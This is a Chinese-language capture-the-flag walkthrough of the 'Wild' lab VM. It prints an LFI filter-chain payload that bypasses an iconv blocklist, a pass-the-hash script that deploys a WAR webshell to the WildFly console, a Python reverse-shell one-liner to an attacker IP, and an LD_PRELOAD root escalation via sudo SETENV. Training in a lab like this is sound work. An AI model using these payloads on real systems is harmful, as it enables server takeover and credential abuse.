# Wild

:::note

[Linux VM] [Tested on VirtualBox] created by || cromiphi

⏲️ Release Date // 2024-02-14

✔️ MD5 // 8ada0b4670e56b3e73e954f12b5f6ce4

☠ Root // 0

💀 User // 0

📝Notes //
Enjoy it.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.106
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.106 (192.168.56.106)
Host is up (0.00047s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
80/tcp   open  http          Apache httpd 2.4.57 ((Debian))
|_http-title: burger html5 landing page
|_http-server-header: Apache/2.4.57 (Debian)
8080/tcp open  http-proxy
|_http-title: Welcome to WildFly
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Wed, 14 Feb 2024 08:32:08 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GetRequest:
|     HTTP/1.1 200 OK
|     Connection: close
|     Last-Modified: Wed, 18 Oct 2023 06:43:38 GMT
|     Content-Length: 1590
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Date: Wed, 14 Feb 2024 08:32:06 GMT
|     <!--
|     Copyright The WildFly Authors
|     SPDX-License-Identifier: Apache-2.0
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <!-- proper charset -->
|     <meta http-equiv="content-type" content="text/html;charset=utf-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
|     <title>Welcome to WildFly</title>
|     <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
|     <link rel="StyleSheet" href="wildfly.css" type="text/css">
|     </head>
|     <body>
|     <div class="wrapper">
|     <div class="content">
|     <div class="logo">
|     <img src="wildfly_logo.png" alt="WildFly" border="0" />
|     </div>
|     <h1>Welcome to WildFly</h1>
|     <h3>Your WildFly instance is ru
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     Allow: GET, HEAD, POST
|     Connection: close
|     Content-Length: 83
|     Content-Type: text/html
|     Date: Wed, 14 Feb 2024 08:32:07 GMT
|     <html><head><title>Error</title></head><body>405 - Method Not Allowed</body></html>
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|_    Connection: close
8443/tcp open  ssl/https-alt
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2024-02-14T08:32:07
|_Not valid after:  2034-02-11T08:32:07
|_http-title: Welcome to WildFly
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Wed, 14 Feb 2024 08:32:14 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GetRequest:
|     HTTP/1.1 200 OK
|     Connection: close
|     Last-Modified: Wed, 18 Oct 2023 06:43:38 GMT
|     Content-Length: 1590
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Date: Wed, 14 Feb 2024 08:32:14 GMT
|     <!--
|     Copyright The WildFly Authors
|     SPDX-License-Identifier: Apache-2.0
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <!-- proper charset -->
|     <meta http-equiv="content-type" content="text/html;charset=utf-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
|     <title>Welcome to WildFly</title>
|     <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
|     <link rel="StyleSheet" href="wildfly.css" type="text/css">
|     </head>
|     <body>
|     <div class="wrapper">
|     <div class="content">
|     <div class="logo">
|     <img src="wildfly_logo.png" alt="WildFly" border="0" />
|     </div>
|     <h1>Welcome to WildFly</h1>
|     <h3>Your WildFly instance is ru
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     Allow: GET, HEAD, POST
|     Connection: close
|     Content-Length: 83
|     Content-Type: text/html
|     Date: Wed, 14 Feb 2024 08:32:14 GMT
|_    <html><head><title>Error</title></head><body>405 - Method Not Allowed</body></html>
|_ssl-date: TLS randomness does not represent time
9990/tcp open  osm-appsrvr?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Wed, 14 Feb 2024 08:32:27 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|   GetRequest:
|     HTTP/1.1 302 Found
|     Connection: close
|     Location: /console/index.html
|     Content-Length: 0
|     Date: Wed, 14 Feb 2024 08:32:06 GMT
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     Connection: close
|     Content-Length: 83
|     Content-Type: text/html
|     Date: Wed, 14 Feb 2024 08:32:07 GMT
|_    <html><head><title>Error</title></head><body>405 - Method Not Allowed</body></html>
```

## web 服务 Port-80

尝试进行目录爆破，得到以下信息

```plaintext
[16:36:20] 200 -    3B  - /about.php
[16:36:32] 301 -  314B  - /css  ->  http://192.168.56.106/css/
[16:36:35] 301 -  316B  - /fonts  ->  http://192.168.56.106/fonts/
[16:36:37] 301 -  317B  - /images  ->  http://192.168.56.106/images/
[16:36:37] 200 -    4KB - /images/
[16:36:37] 200 -   19KB - /index.php
[16:36:37] 200 -   19KB - /index.php/login/
[16:36:38] 200 -    1KB - /js/
```

未发现有价值的信息

对首页的功能点进行探测，发现以下链接

```plaintext
http://192.168.56.106/recipe.php
```

经过简单的功能探测，发现可能存在本地文件包含（LFI）

### 本地文件读取

```php title="fatty-burger.php"
# http://192.168.56.106/recipe.php?file=php://filter/read=convert.base64-encode/resource=fatty-burger.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fatty Burger Recipe</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/flaticon.css" />
    <link rel="stylesheet" href="css/animate.css">
    <link rel="stylesheet" href="css/bootsnav.css">
    <link rel="stylesheet" href="css/color.css">
    <link rel="stylesheet" href="css/custom.css" />
</head>
<body data-spy="scroll" data-target="#navbar-menu" data-offset="100">
    <section id="block">
        <div class="container">
            <div class="row">
                <div class="col-md-8 col-md-offset-2">
                    <div class="feature">
                        <h1>Fatty Burger Recipe</h1>
   <div class="recipe-content">
   <br>
   <br>
   <p style="color: white; font-weight: bold; font-size: 22px;">A double layer of sear-sizzled 100% pure beef mingled with special sauce on a sesame seed bun and topped with melty American cheese, crisp lettuce, minced onions, and tangy pickles.</p>
                        <p> A double layer of sear-sizzled 100% pure beef mingled with special sauce on a sesame seed bun and topped with melty American cheese, crisp lettuce, minced onions, and tangy pickles.</p>
                        <p><strong>Based on pre-cooked patty weight.</strong></p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script src="http://code.jquery.com/jquery-1.12.1.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
    <script src="js/bootsnav.js"></script>
</body>
</html>
```

尝试读取点单页面

```php title="recipe.php"
# http://192.168.56.106/recipe.php?file=php://filter/read=convert.base64-encode/resource=recipe.php
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Food</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/flaticon.css" />
    <link rel="stylesheet" href="css/animate.css">
    <link rel="stylesheet" href="css/bootsnav.css">
    <link rel="stylesheet" href="css/color.css">
    <link rel="stylesheet" href="css/custom.css" />
</head>
<body data-spy="scroll" data-target="#navbar-menu" data-offset="100">
    <nav class="navbar navbar-default bootsnav no-background navbar-fixed black">
        <div class="container">
            <div class="navbar-header">
                <a class="navbar-brand" href="#"><img src="images/logo.png" class="logo" alt=""></a>
            </div>
        </div>
    </nav>
    <section id="block">
        <div class="container">
            <div class="row">
                <div class="col-md-8 col-md-offset-2">
                    <div class="feature">
                        <h1>Welcome !</h1>
   <p style="color: red; font-weight: bold;font-size: 24px;">Choose a recipe :</p>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="?file=fatty-burger.php">Fatty Burger</a></li>
                            <li class="list-group-item"><a href="?file=shack-burger.php">Shack Burger</a></li>
                            <li class="list-group-item"><a href="?file=cheddar-burger.php">Cheddar Junky Stuffed Burgers</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script src="http://code.jquery.com/jquery-1.12.1.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
    <script src="js/bootsnav.js"></script>
</body>
</html>


<?php
ini_set('allow_url_include', '0');

function isForbidden($input) {
    return stripos($input, "iconv") !== false;
}

if(isset($_GET['file'])) {
    $file = $_GET['file'];

    if (isForbidden($file)) {
        echo "<div class='container'><div class='alert alert-danger'>Access denied !</div></div>";
    } elseif (strncmp($file, "/", 1) !== 0 && strncmp($file, "..", 2) !== 0) {
        @include($file);
    } else {
        echo "<div class='container'><div class='alert alert-danger'>Access denied !</div></div>";
    }
}
?>
```

可以看出，网站关闭了远程文件包含，同时这里对 `iconv` 和 `/` 以及 `..` 进行了过滤，但是实际测试中并没有实质性限制

```plaintext title="/etc/passwd"
# http://192.168.56.106/recipe.php?file=php://filter/read=convert.base64-encode/resource=../../../../../../../etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:103:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
tod:x:1002:1002:,,,:/home/tod:/bin/zsh
```

从 `/etc/passwd` 的数据中，可以得知靶机上的两个可访问用户

```plaintext
root
tod
```

并且通过探测，可以定位到网站数据的绝对地址

```plaintext
/var/www/html
```

## WildFly Port-8080

尝试访问，服务器返回

```plaintext
Your WildFly instance is running

To replace this page simply deploy your own war with / as its context path.
To disable it, remove the "welcome-content" handler for location / in the undertow subsystem.
```

## WildFly Port-8443

此端口同样为 WildFly 服务，只是协议为 HTTPS

## WildFly Management Console Port-9990

此端口为 WildFly 服务的管理后台

## LFI 绕过过滤器实现 webshell

使用 [synacktiv/php_filter_chain_generator - Github](https://github.com/synacktiv/php_filter_chain_generator/) 生成攻击载荷

然后用 `%25xx` 绕过对 iconv 的检测

```plaintext
http://192.168.56.106/recipe.php?file=php://filter/convert.i%2563onv.UTF8.CSISO2022KR|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.UTF8.UTF16|convert.i%2563onv.WINDOWS-1258.UTF32LE|convert.i%2563onv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.ISO2022KR.UTF16|convert.i%2563onv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.865.UTF16|convert.i%2563onv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CSA_T500.UTF-32|convert.i%2563onv.CP857.ISO-2022-JP-3|convert.i%2563onv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.IBM891.CSUNICODE|convert.i%2563onv.ISO8859-14.ISO6937|convert.i%2563onv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.UTF8.UTF16LE|convert.i%2563onv.UTF8.CSISO2022KR|convert.i%2563onv.UCS2.UTF8|convert.i%2563onv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP861.UTF-16|convert.i%2563onv.L4.GB13000|convert.i%2563onv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP869.UTF-32|convert.i%2563onv.MACUK.UCS4|convert.i%2563onv.UTF16BE.866|convert.i%2563onv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.JS.UNICODE|convert.i%2563onv.L4.UCS2|convert.i%2563onv.UCS-2.OSF00030010|convert.i%2563onv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.PT.UTF32|convert.i%2563onv.KOI8-U.IBM-932|convert.i%2563onv.SJIS.EUCJP-WIN|convert.i%2563onv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.ISO88597.UTF16|convert.i%2563onv.RK1048.UCS-4LE|convert.i%2563onv.UTF32.CP1167|convert.i%2563onv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.INIS.UTF16|convert.i%2563onv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.L5.UTF-32|convert.i%2563onv.ISO88594.GB13000|convert.i%2563onv.CP950.SHIFT_JISX0213|convert.i%2563onv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP861.UTF-16|convert.i%2563onv.L4.GB13000|convert.i%2563onv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP861.UTF-16|convert.i%2563onv.L4.GB13000|convert.i%2563onv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.INIS.UTF16|convert.i%2563onv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.L5.UTF-32|convert.i%2563onv.ISO88594.GB13000|convert.i%2563onv.CP950.SHIFT_JISX0213|convert.i%2563onv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.863.UNICODE|convert.i%2563onv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.ISO88597.UTF16|convert.i%2563onv.RK1048.UCS-4LE|convert.i%2563onv.UTF32.CP1167|convert.i%2563onv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.PT.UTF32|convert.i%2563onv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.JS.UNICODE|convert.i%2563onv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.SE2.UTF-16|convert.i%2563onv.CSIBM921.NAPLPS|convert.i%2563onv.855.CP936|convert.i%2563onv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.JS.UNICODE|convert.i%2563onv.L4.UCS2|convert.i%2563onv.UCS-2.OSF00030010|convert.i%2563onv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CSGB2312.UTF-32|convert.i%2563onv.IBM-1161.IBM932|convert.i%2563onv.GB13000.UTF16BE|convert.i%2563onv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.SE2.UTF-16|convert.i%2563onv.CSIBM1161.IBM-932|convert.i%2563onv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.PT.UTF32|convert.i%2563onv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.SE2.UTF-16|convert.i%2563onv.CSIBM1161.IBM-932|convert.i%2563onv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.SE2.UTF-16|convert.i%2563onv.CSIBM921.NAPLPS|convert.i%2563onv.855.CP936|convert.i%2563onv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.8859_3.UTF16|convert.i%2563onv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP1046.UTF16|convert.i%2563onv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP1046.UTF32|convert.i%2563onv.L6.UCS-2|convert.i%2563onv.UTF-16LE.T.61-8BIT|convert.i%2563onv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.MAC.UTF16|convert.i%2563onv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CSIBM1161.UNICODE|convert.i%2563onv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.INIS.UTF16|convert.i%2563onv.CSIBM1133.IBM943|convert.i%2563onv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.SE2.UTF-16|convert.i%2563onv.CSIBM1161.IBM-932|convert.i%2563onv.MS932.MS936|convert.i%2563onv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.base64-decode/resource=php://temp&1=phpinfo();
```

尝试使用 `AntSword` 建立连接，成功连接 webshell，将会话反弹至监听器

```shell
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs -lp 8888
[18:20:02] Welcome to pwncat 🐈!
[18:20:53] received connection from 192.168.56.106:44852
[18:20:53] 192.168.56.106:44852: registered new host w/ db
(local) pwncat$ back
(remote) www-data@wild.hmv:/var/www/html$ whoami
www-data
```

## 利用 WildFly 得到的用户哈希部署 Webshell

```plaintext title="/opt/wildfly/domain/configuration/mgmt-users.properties"
#
# Properties declaration of users for the realm 'ManagementRealm' which is the default realm
# for new installations. Further authentication mechanism can be configured
# as part of the <management /> in host.xml.
#
# Users can be added to this properties file at any time, updates after the server has started
# will be automatically detected.
#
# By default the properties realm expects the entries to be in the format: -
# username=HEX(MD5( username ':' realm ':' password))
#
# A utility script is provided which can be executed from the bin folder to add the users: -
# - Linux
#  bin/add-user.sh
#
# - Windows
#  bin\add-user.bat
#
#$REALM_NAME=ManagementRealm$ This line is used by the add-user utility to identify the realm name already used in this file.
#
# On start-up the server will also automatically add a user $local - this user is specifically
# for local tools running against this AS installation.
#
# The following illustrates how an admin user could be defined, this
# is for illustration only and does not correspond to a usable password.
#
administrator=3bfa7f34174555fe766d0e0295821742
```

### 利用用户名与哈希进入 console 部署 war 包

<details>

<summary> Jboss_cracker.py </summary>

```python
from urllib.parse import urlparse
from requests.auth import *
import hashlib
import os
import re
import threading
import time
import warnings
from base64 import b64encode



class HTTPDigestAuth1(AuthBase):
    """Attaches HTTP Digest Authentication to the given Request object."""

    def __init__(self, username, password):
        self.username = username
        self.password = password
        self._thread_local = threading.local()

    def init_per_thread_state(self):
        if not hasattr(self._thread_local, "init"):
            self._thread_local.init = True
            self._thread_local.last_nonce = ""
            self._thread_local.nonce_count = 0
            self._thread_local.chal = {}
            self._thread_local.pos = None
            self._thread_local.num_401_calls = None

    def build_digest_header(self, method, url):
        """
        :rtype: str
        """

        realm = self._thread_local.chal["realm"]
        nonce = self._thread_local.chal["nonce"]
        qop = self._thread_local.chal.get("qop")
        algorithm = self._thread_local.chal.get("algorithm")
        opaque = self._thread_local.chal.get("opaque")
        hash_utf8 = None

        if algorithm is None:
            _algorithm = "MD5"
        else:
            _algorithm = algorithm.upper()
        if _algorithm == "MD5" or _algorithm == "MD5-SESS":

            def md5_utf8(x):
                if isinstance(x, str):
                    x = x.encode("utf-8")
                return hashlib.md5(x).hexdigest()

            hash_utf8 = md5_utf8
        elif _algorithm == "SHA":

            def sha_utf8(x):
                if isinstance(x, str):
                    x = x.encode("utf-8")
                return hashlib.sha1(x).hexdigest()

            hash_utf8 = sha_utf8
        elif _algorithm == "SHA-256":

            def sha256_utf8(x):
                if isinstance(x, str):
                    x = x.encode("utf-8")
                return hashlib.sha256(x).hexdigest()

            hash_utf8 = sha256_utf8
        elif _algorithm == "SHA-512":

            def sha512_utf8(x):
                if isinstance(x, str):
                    x = x.encode("utf-8")
                return hashlib.sha512(x).hexdigest()

            hash_utf8 = sha512_utf8

        KD = lambda s, d: hash_utf8(f"{s}:{d}")  # noqa:E731

        if hash_utf8 is None:
            return None

        entdig = None
        p_parsed = urlparse(url)
        path = p_parsed.path or "/"
        if p_parsed.query:
            path += f"?{p_parsed.query}"

        A1 = f"{self.username}:{realm}:{self.password}"
        A2 = f"{method}:{path}"

        # HA1 = hash_utf8(A1)
        HA1 = self.realAuth
        HA2 = hash_utf8(A2)

        if nonce == self._thread_local.last_nonce:
            self._thread_local.nonce_count += 1
        else:
            self._thread_local.nonce_count = 1
        ncvalue = f"{self._thread_local.nonce_count:08x}"
        s = str(self._thread_local.nonce_count).encode("utf-8")
        s += nonce.encode("utf-8")
        s += time.ctime().encode("utf-8")
        s += os.urandom(8)

        cnonce = hashlib.sha1(s).hexdigest()[:16]
        if _algorithm == "MD5-SESS":
            HA1 = hash_utf8(f"{HA1}:{nonce}:{cnonce}")

        if not qop:
            respdig = KD(HA1, f"{nonce}:{HA2}")
        elif qop == "auth" or "auth" in qop.split(","):
            noncebit = f"{nonce}:{ncvalue}:{cnonce}:auth:{HA2}"
            respdig = KD(HA1, noncebit)
        else:
            return None

        self._thread_local.last_nonce = nonce

        base = (
            f'username="{self.username}", realm="{realm}", nonce="{nonce}",'
            f'uri="{path}", response="{respdig}"'
        )
        if opaque:
            base += f', opaque="{opaque}"'
        if algorithm:
            base += f', algorithm="{algorithm}"'
        if entdig:
            base += f', digest="{entdig}"'
        if qop:
            base += f', qop="auth", nc={ncvalue}, cnonce="{cnonce}"'

        return f"Digest {base}"

    def handle_redirect(self, r, **kwargs):
        """Reset num_401_calls counter on redirects."""
        if r.is_redirect:
            self._thread_local.num_401_calls = 1

    def handle_401(self, r, **kwargs):
        """
        Takes the given response and tries digest-auth, if needed.

        :rtype: requests.Response
        """

        if not 400 <= r.status_code < 500:
            self._thread_local.num_401_calls = 1
            return r

        if self._thread_local.pos is not None:
            r.request.body.seek(self._thread_local.pos)
        s_auth = r.headers.get("www-authenticate", "")

        if "digest" in s_auth.lower() and self._thread_local.num_401_calls < 2:

            self._thread_local.num_401_calls += 1
            pat = re.compile(r"digest", flags=re.IGNORECASE)
            self._thread_local.chal = parse_dict_header(pat.sub("", s_auth, count=1))

            r.content
            r.close()
            prep = r.request.copy()
            extract_cookies_to_jar(prep._cookies, r.request, r.raw)
            prep.prepare_cookies(prep._cookies)

            prep.headers["Authorization"] = self.build_digest_header(
                prep.method, prep.url
            )
            _r = r.connection.send(prep, **kwargs)
            _r.history.append(r)
            _r.request = prep

            return _r

        self._thread_local.num_401_calls = 1
        return r

    def __call__(self, r):
        self.init_per_thread_state()
        if self._thread_local.last_nonce:
            r.headers["Authorization"] = self.build_digest_header(r.method, r.url)
        try:
            self._thread_local.pos = r.body.tell()
        except AttributeError:
            self._thread_local.pos = None
        r.register_hook("response", self.handle_401)
        r.register_hook("response", self.handle_redirect)
        self._thread_local.num_401_calls = 1

        return r

    def __eq__(self, other):
        return all(
            [
                self.username == getattr(other, "username", None),
                self.password == getattr(other, "password", None),
            ]
        )

    def __ne__(self, other):
        return not self == other

import requests
def main():
    auth = HTTPDigestAuth1('administrator', 'idk')
    auth.realAuth = '3bfa7f34174555fe766d0e0295821742'
    r = requests.get('http://192.168.56.106:9990/management?operation=attribute&name=server-state&json.pretty=1', auth=auth)
    _ = r.status_code
    print(_)
    print(r.text)
    assert _ == 200
    r = requests.post('http://192.168.56.106:9990/management/add-content',files={"file":open("shell.war","rb")}, auth=auth)
    _ = r.status_code
    print(_)
    print(r.text)
    resp = r.json()
    v = resp['result']
    url = 'http://192.168.56.106:9990/management'
    data = {
        "content": [
            {"hash": v}
        ],
        "address": [{"deployment": "tiny-webapp.war"}],
        "operation": "add",
        "enabled": "true"
    }
    headers = {'Content-Type': 'application/json'}

    response = requests.post(url, json=data, auth=auth, headers=headers)
    print(response.status_code)
    print(response.text)


__name__ == "__main__" and main()
```

</details>

<details>

<summary> shell.war </summary>

[shell.war](./shell.war)

</details>

执行后，即可在 `http://192.168.56.106:8080/tiny-webapp/shell.jsp` 访问 webshell

### 反弹 shell

因为 Java 中编码的特性，建议执行反向 shell 的时候先经过一层 base64 编码，具体可以参考：[java.lang.Runtime.exec（）有效载荷解决方法 | 离沫凌天๓](https://www.lintstar.top/shell-java/)

原 payload 为：

```plaintext
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

具体的链接为

```plaintext
http://192.168.56.106:8080/tiny-webapp/shell.jsp?cmd=python3+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.56.102%22%2C6666%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport+pty%3B+pty.spawn%28%22bash%22%29%27
```

即可收到回连的 shell

```shell
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs -lp 6666
[19:31:36] Welcome to pwncat 🐈!                                                                                                                                                                 __main__.py:164
[19:33:31] received connection from 192.168.56.106:34176                                                                                                                                              bind.py:84
[19:33:32] 192.168.56.106:34176: registered new host w/ db                                                                                                                                        manager.py:957
(local) pwncat$ back
(remote) tod@wild.hmv:/opt/wildfly/bin$ whoami
tod
```

## User - tod

### flag - user

```shell
(remote) tod@wild.hmv:/home/tod$ cat user.txt
c1cc7f5179a168ec93095695f20c9e3f
```

### 提权

```plaintext title="sudo -l"
Matching Defaults entries for tod on wild:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User tod may run the following commands on wild:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/info
```

## User - root

可以借助 SETENV 实现链接库注入，从而实现代码执行

```plaintext title="exia.c"
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void init()
{
    puts("Hello dynamic linkage world!");
    unsetenv("LD_PRELOAD");
    system("/bin/bash");
}
```

然后编译注入

```shell
(remote) tod@wild.hmv:/home/tod$ nano exia.c
(remote) tod@wild.hmv:/home/tod$ gcc -shared -fPIC -o exia.so exia.c
(remote) tod@wild.hmv:/home/tod$ sudo LD_PRELOAD=/home/tod/exia.so /usr/bin/info
